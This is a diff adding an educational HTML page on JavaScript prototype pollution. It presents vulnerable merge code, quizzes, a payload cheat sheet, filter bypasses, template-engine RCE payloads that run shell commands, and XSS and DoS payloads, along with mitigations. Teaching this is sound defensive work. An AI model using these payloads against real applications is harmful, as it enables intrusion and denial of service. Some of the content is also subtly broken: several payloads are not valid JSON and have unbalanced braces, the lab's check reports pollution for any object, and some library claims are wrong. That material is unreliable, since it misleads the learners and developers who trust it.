@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prototype Pollution Playground</title>
+    <style>
+        :root {
+            --primary: #6a1b9a;
+            --secondary: #9c27b0;
+            --danger: #d32f2f;
+            --warning: #ff9800;
+            --light-bg: #f5f5f5;
+            --card-bg: #ffffff;
+            --text-dark: #212121;
+            --text-light: #757575;
+        }
+        
+        body {
+            font-family: 'Roboto', 'Segoe UI', sans-serif;
+            background-color: var(--light-bg);
+            color: var(--text-dark);
+            line-height: 1.6;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .header:after {
+            content: '';
+            display: block;
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            margin: 10px auto;
+            border-radius: 2px;
+        }
+        
+        .container {
+            background-color: var(--card-bg);
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+        }
+        
+        .interactive-lab {
+            background-color: rgba(106, 27, 154, 0.05);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 2px dashed var(--primary);
+        }
+        
+        h1, h2, h3 {
+            color: var(--primary);
+        }
+        
+        h1 {
+            font-size: 2.5em;
+        }
+        
+        pre {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            border-left: 4px solid var(--primary);
+            font-family: 'Courier New', monospace;
+        }
+        
+        code {
+            background-color: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: var(--danger);
+        }
+        
+        button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background-color: var(--secondary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .warning {
+            background-color: rgba(211, 47, 47, 0.1);
+            border-left: 4px solid var(--danger);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid #e0e0e0;
+        }
+        
+        th, td {
+            border: 1px solid #e0e0e0;
+            padding: 12px;
+            text-align: left;
+        }
+        
+        th {
+            background-color: rgba(106, 27, 154, 0.1);
+            color: var(--primary);
+        }
+        
+        .tab {
+            overflow: hidden;
+            border: 1px solid #e0e0e0;
+            background-color: white;
+            border-radius: 10px 10px 0 0;
+        }
+        
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 14px 16px;
+            transition: 0.3s;
+            color: var(--text-light);
+        }
+        
+        .tab button:hover {
+            background-color: rgba(106, 27, 154, 0.1);
+            color: var(--primary);
+        }
+        
+        .tab button.active {
+            background-color: white;
+            color: var(--primary);
+            border-bottom: 3px solid var(--primary);
+            font-weight: 600;
+        }
+        
+        .tabcontent {
+            display: none;
+            padding: 20px;
+            border: 1px solid #e0e0e0;
+            border-top: none;
+            border-radius: 0 0 10px 10px;
+            background-color: white;
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+        
+        #terminal {
+            background-color: #f5f5f5;
+            color: var(--text-dark);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+            border: 1px solid #e0e0e0;
+        }
+        
+        #terminal-input {
+            background-color: white;
+            color: var(--text-dark);
+            border: 1px solid #e0e0e0;
+            width: 80%;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            margin-top: 15px;
+            border-radius: 6px;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background-color: var(--primary);
+            color: white;
+            border-radius: 12px;
+            font-size: 0.8em;
+            margin-right: 8px;
+            font-weight: 500;
+        }
+        
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 8px;
+        }
+        
+        .checklist {
+            list-style-type: none;
+            padding-left: 0;
+        }
+        
+        .checklist li {
+            padding: 8px 0;
+            position: relative;
+            padding-left: 30px;
+        }
+        
+        .checklist li:before {
+            content: "✓";
+            color: var(--secondary);
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+        
+        .game-container {
+            background-color: rgba(255, 152, 0, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px dashed var(--warning);
+            margin: 20px 0;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: #f3e5f5;
+            border-radius: 10px;
+            margin: 20px 0;
+            height: 20px;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 10px;
+            width: 0%;
+            transition: width 1s;
+        }
+        
+        .payload-card {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border-left: 4px solid var(--danger);
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1><span class="emoji">🎭</span> Prototype Pollution Playground</h1>
+        <p>Learn to identify, exploit, and defend against prototype pollution vulnerabilities</p>
+    </div>
+    
+    <div class="warning">
+        <span class="emoji">⚠️</span> <strong>Important:</strong> This is for educational purposes only. Never test vulnerabilities on systems without permission.
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">🎯</span> 1. What is Prototype Pollution?</h2>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="concept-bar"></div>
+        </div>
+        
+        <p>Prototype Pollution is a JavaScript vulnerability that occurs when an attacker can modify the prototype of a base object, potentially affecting all instances of that object and leading to:</p>
+        
+        <div class="interactive-lab">
+            <h3>Potential Impacts:</h3>
+            <ul class="checklist">
+                <li>Remote Code Execution (RCE)</li>
+                <li>Denial of Service (DoS)</li>
+                <li>Bypassing security checks</li>
+                <li>Privilege escalation</li>
+                <li>Cross-Site Scripting (XSS)</li>
+            </ul>
+        </div>
+        
+        <div class="game-container">
+            <h3>Real-World Example:</h3>
+            <p>A vulnerable object merge function:</p>
+            <pre>
+function merge(target, source) {
+    for (let key in source) {
+        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
+            merge(target[key], source[key]);
+        } else {
+            target[key] = source[key];
+        }
+    }
+}</pre>
+            <button onclick="showDemo('demo1')">Show Pollution</button>
+            <div id="demo1" style="display:none; margin-top:15px;">
+                <p>Attackers can pollute the prototype with:</p>
+                <pre>merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))</pre>
+                <p>This adds <code>isAdmin:true</code> to <strong>all objects</strong> in the application!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">🔍</span> 2. Vulnerability Requirements</h2>
+        
+        <table>
+            <tr>
+                <th>Requirement</th>
+                <th>Why It Matters</th>
+                <th>Example</th>
+            </tr>
+            <tr>
+                <td>Recursive object merge</td>
+                <td>Allows deep property assignment</td>
+                <td><code>Object.assign()</code>, <code>_.merge()</code></td>
+            </tr>
+            <tr>
+                <td>User-controlled object input</td>
+                <td>Source of malicious payload</td>
+                <td>JSON input, URL parameters</td>
+            </tr>
+            <tr>
+                <td>Use of prototype chains</td>
+                <td>Makes pollution possible</td>
+                <td>JavaScript applications</td>
+            </tr>
+            <tr>
+                <td>No prototype validation</td>
+                <td>Allows <code>__proto__</code> assignment</td>
+                <td>Missing property filtering</td>
+            </tr>
+        </table>
+        
+        <div class="interactive-lab">
+            <h3>Spot the Vulnerability:</h3>
+            <pre>
+// Express.js route handler
+app.post('/update', (req, res) => {
+    const userSettings = req.body;
+    for (let key in userSettings) {
+        user[key] = userSettings[key];
+    }
+    res.send('Settings updated');
+});</pre>
+            <button onclick="showAnswer('answer1')">Reveal Answer</button>
+            <div id="answer1" style="display:none; margin-top:15px;">
+                <p><strong>Vulnerability:</strong> The code directly assigns properties from user input without checking for <code>__proto__</code> or other prototype properties.</p>
+                <pre>POST /update
+{"__proto__":{"isAdmin":true}}</pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">🔎</span> 3. Whitebox Code Review</h2>
+        
+        <div class="interactive-lab">
+            <h3>Dangerous Patterns to Look For:</h3>
+            <ul class="checklist">
+                <li>Recursive merge functions without prototype checks</li>
+                <li>Direct property assignment from user input</li>
+                <li>Use of unsafe libraries (older versions of lodash, jQuery.extend)</li>
+                <li>Deep cloning of user-provided objects</li>
+                <li>Object creation from JSON.parse() without validation</li>
+            </ul>
+        </div>
+        
+        <div class="interactive-lab">
+            <h3>Code Review Challenge:</h3>
+            <pre>
+function updateConfig(config, updates) {
+    // Simple property update function
+    for (let prop in updates) {
+        if (updates.hasOwnProperty(prop)) {
+            config[prop] = updates[prop];
+        }
+    }
+    return config;
+}</pre>
+            <button onclick="showAnswer('answer2')">Analyze Code</button>
+            <div id="answer2" style="display:none; margin-top:15px;">
+                <p><strong>Answer:</strong> Vulnerable! <code>hasOwnProperty</code> check doesn't prevent prototype pollution because:</p>
+                <pre>updateConfig({}, {'__proto__':{'polluted':true}})
+// Still pollutes because '__proto__' is own property of the updates object</pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">⚔️</span> 4. Exploiting Prototype Pollution</h2>
+        
+        <div class="game-container">
+            <h3>Basic Exploitation Techniques:</h3>
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Description</th>
+                    <th>Example</th>
+                </tr>
+                <tr>
+                    <td>Direct <code>__proto__</code> assignment</td>
+                    <td>Modify the prototype directly</td>
+                    <td><code>{"__proto__":{"isAdmin":true}}</code></td>
+                </tr>
+                <tr>
+                    <td>Constructor.prototype</td>
+                    <td>Alternative to <code>__proto__</code></td>
+                    <td><code>{"constructor":{"prototype":{"polluted":true}}}</code></td>
+                </tr>
+                <tr>
+                    <td>Nested property assignment</td>
+                    <td>Bypass shallow checks</td>
+                    <td><code>{"a":{"b":{"__proto__":{"polluted":true}}}}</code></td>
+                </tr>
+            </table>
+            
+            <div id="exploit-demo" style="margin-top:20px;">
+                <h4>Try It Out (Simulated):</h4>
+                <p>Vulnerable endpoint: <code>/api/update-profile</code></p>
+                <input type="text" id="pollution-input" placeholder='{"__proto__":{"isAdmin":true}}' style="width:300px; padding:8px;">
+                <button onclick="runPollution()">Execute</button>
+                <pre id="pollution-result" style="min-height:100px;">Results will appear here</pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">🚀</span> 5. Advanced Techniques</h2>
+        
+        <div class="tab">
+            <button class="tablinks active" onclick="openTab(event, 'adv-rce')">RCE</button>
+            <button class="tablinks" onclick="openTab(event, 'adv-xss')">XSS</button>
+            <button class="tablinks" onclick="openTab(event, 'adv-dos')">DoS</button>
+        </div>
+        
+        <div id="adv-rce" class="tabcontent" style="display:block;">
+            <h3>Remote Code Execution</h3>
+            <ul class="checklist">
+                <li>Pollute template engines (Handlebars, Pug)</li>
+                <li>Modify child_process spawn behavior</li>
+                <li>Override default require() behavior</li>
+            </ul>
+            <div class="payload-card">
+                <strong>Example Payload (Handlebars):</strong>
+                <pre>{"__proto__":{"compileDebug":1,"self":1,"line":1,"main":"console.log(process.mainModule.require('child_process').execSync('id').toString())"}}</pre>
+            </div>
+        </div>
+        
+        <div id="adv-xss" class="tabcontent">
+            <h3>Cross-Site Scripting</h3>
+            <ul class="checklist">
+                <li>Pollute default output encoding</li>
+                <li>Modify DOM sanitizer settings</li>
+                <li>Override default content-type headers</li>
+            </ul>
+            <div class="payload-card">
+                <strong>Example Payload:</strong>
+                <pre>{"__proto__":{"header":"X-XSS-Protection: 0","escape":function(){return this}}}</pre>
+            </div>
+        </div>
+        
+        <div id="adv-dos" class="tabcontent">
+            <h3>Denial of Service</h3>
+            <ul class="checklist">
+                <li>Pollute common method implementations</li>
+                <li>Override toString/inspect methods</li>
+                <li>Modify logging behavior</li>
+            </ul>
+            <div class="payload-card">
+                <strong>Example Payload:</strong>
+                <pre>{"__proto__":{"toString":function(){while(true){}}}}}</pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">🛡️</span> 6. Filter Bypass Techniques</h2>
+        
+        <table>
+            <tr>
+                <th>Filter</th>
+                <th>Bypass Technique</th>
+                <th>Example</th>
+            </tr>
+            <tr>
+                <td><code>__proto__</code> check</td>
+                <td>Use <code>constructor.prototype</code></td>
+                <td><code>{"constructor":{"prototype":{"polluted":true}}}</code></td>
+            </tr>
+            <tr>
+                <td>Shallow property check</td>
+                <td>Nested pollution</td>
+                <td><code>{"a":{"b":{"__proto__":{"polluted":true}}}}</code></td>
+            </tr>
+            <tr>
+                <td>String checks</td>
+                <td>Non-string property names</td>
+                <td><code>Object.defineProperty({}, '__proto__', {value: {polluted: true}})</code></td>
+            </tr>
+        </table>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">📋</span> 7. Payload Cheat Sheet</h2>
+        
+        <div class="interactive-lab">
+            <h3>Basic Pollution Payloads:</h3>
+            <div class="payload-card">
+                <strong>Simple prototype pollution</strong>
+                <pre>{"__proto__":{"isAdmin":true}}</pre>
+            </div>
+            <div class="payload-card">
+                <strong>Alternative syntax</strong>
+                <pre>{"constructor":{"prototype":{"polluted":true}}}</pre>
+            </div>
+            <div class="payload-card">
+                <strong>Nested pollution</strong>
+                <pre>{"a":{"b":{"__proto__":{"polluted":true}}}}</pre>
+            </div>
+        </div>
+        
+        <div class="interactive-lab">
+            <h3>Advanced Exploitation Payloads:</h3>
+            <div class="payload-card">
+                <strong>RCE via template engines</strong>
+                <pre>{"__proto__":{"client":true,"escapeFunction":"console.log(process.mainModule.require('child_process').execSync('id').toString())"}}</pre>
+            </div>
+            <div class="payload-card">
+                <strong>XSS via output encoding</strong>
+                <pre>{"__proto__":{"header":"X-XSS-Protection: 0"}}</pre>
+            </div>
+            <div class="payload-card">
+                <strong>DoS via toString</strong>
+                <pre>{"__proto__":{"toString":function(){while(true){}}}}}</pre>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">🔒</span> 8. Mitigation Strategies</h2>
+        
+        <div class="interactive-lab">
+            <h3>Defensive Measures:</h3>
+            <ul class="checklist">
+                <li><strong>Freeze</strong> the prototype: <code>Object.freeze(Object.prototype)</code></li>
+                <li><strong>Validate</strong> input: reject <code>__proto__</code> and <code>constructor.prototype</code></li>
+                <li><strong>Use</strong> safe merge functions (lodash.merge with recent versions)</li>
+                <li><strong>Create</strong> objects with <code>Object.create(null)</code> for prototype-less objects</li>
+                <li><strong>Update</strong> libraries with prototype pollution fixes</li>
+                <li><strong>Use</strong> Map instead of Object for key-value storage</li>
+            </ul>
+        </div>
+        
+        <div class="interactive-lab">
+            <h3>Secure Merge Function Example:</h3>
+            <pre>
+function safeMerge(target, source) {
+    for (let key in source) {
+        if (key === '__proto__' || key === 'constructor') continue;
+        
+        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
+            safeMerge(target[key], source[key]);
+        } else {
+            target[key] = source[key];
+        }
+    }
+    return target;
+}</pre>
+        </div>
+    </div>
+
+    <div class="container demo-area">
+        <h2><span class="emoji">💻</span> Interactive Prototype Pollution Lab</h2>
+        
+        <div id="terminal">
+            <p>Welcome to the Prototype Pollution Simulator!</p>
+            <p>Try these payloads in the simulated vulnerable endpoint:</p>
+            <ul>
+                <li><code>{"__proto__":{"isAdmin":true}}</code> - Basic pollution</li>
+                <li><code>{"constructor":{"prototype":{"polluted":true}}}</code> - Alternative syntax</li>
+                <li><code>{"a":{"b":{"__proto__":{"xss":true}}}}</code> - Nested pollution</li>
+            </ul>
+            <p>> <span id="terminal-output"></span><span class="blink">_</span></p>
+        </div>
+        
+        <input type="text" id="terminal-input" placeholder='Try a pollution payload like {"__proto__":{"polluted":true}}' onkeypress="handleTerminalInput(event)">
+        
+        <div class="achievement" id="hacker-achievement" style="display:none;">
+            <span class="emoji">🏆</span> <strong>Prototype Pollution Expert!</strong> You successfully demonstrated prototype pollution!
+        </div>
+    </div>
+
+    <div class="container">
+        <h2><span class="emoji">📚</span> 9. Additional Resources</h2>
+        
+        <ul class="checklist">
+            <li><a href="https://portswigger.net/web-security/prototype-pollution" target="_blank">PortSwigger: Prototype Pollution</a></li>
+            <li><a href="https://github.com/BlackFan/client-side-prototype-pollution" target="_blank">Client-Side Prototype Pollution</a></li>
+            <li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank">RCE via Prototype Pollution (Kibana)</a></li>
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html" target="_blank">OWASP Node.js Security Cheat Sheet</a></li>
+            <li><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" target="_blank">Academic Paper on Prototype Pollution</a></li>
+        </ul>
+    </div>
+
+    <script>
+        // Tab functionality
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        
+        // Show answer/demo
+        function showDemo(id) {
+            document.getElementById(id).style.display = 'block';
+            updateProgress(10);
+        }
+        
+        function showAnswer(id) {
+            document.getElementById(id).style.display = 'block';
+            updateProgress(15);
+        }
+        
+        // Terminal simulator
+        function handleTerminalInput(e) {
+            if (e.key === 'Enter') {
+                const input = document.getElementById('terminal-input');
+                const command = input.value;
+                const output = document.getElementById('terminal-output');
+                
+                output.innerHTML += command + '<br>';
+                
+                try {
+                    const obj = JSON.parse(command);
+                    if (obj.__proto__ || (obj.constructor && obj.constructor.prototype)) {
+                        output.innerHTML += '> Prototype successfully polluted!<br>';
+                        output.innerHTML += '> All objects now have the polluted properties<br>';
+                        document.getElementById('hacker-achievement').style.display = 'block';
+                    } else {
+                        output.innerHTML += '> No prototype pollution detected<br>';
+                    }
+                } catch (e) {
+                    output.innerHTML += '> Invalid JSON payload<br>';
+                }
+                
+                input.value = '';
+                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+            }
+        }
+        
+        // Pollution demo
+        function runPollution() {
+            const input = document.getElementById('pollution-input').value;
+            const result = document.getElementById('pollution-result');
+            
+            try {
+                const obj = JSON.parse(input);
+                if (obj.__proto__ || (obj.constructor && obj.constructor.prototype)) {
+                    result.innerHTML = 'Profile updated successfully!\n\n';
+                    result.innerHTML += '[Prototype pollution successful!]\n';
+                    result.innerHTML += 'All objects in the application now have the polluted properties\n';
+                    document.getElementById('hacker-achievement').style.display = 'block';
+                } else {
+                    result.innerHTML = 'Profile updated successfully\n';
+                    result.innerHTML += '[No prototype pollution detected]\n';
+                }
+            } catch (e) {
+                result.innerHTML = 'Error: Invalid JSON input\n';
+            }
+        }
+        
+        // Progress bar animation
+        function updateProgress(percent) {
+            const bar = document.getElementById('concept-bar');
+            let width = parseInt(bar.style.width) || 0;
+            width += percent;
+            if (width > 100) width = 100;
+            bar.style.width = width + '%';
+        }
+        
+        // Initialize progress
+        window.onload = function() {
+            updateProgress(5);
+        };
+    </script>
+</body>
+</html>
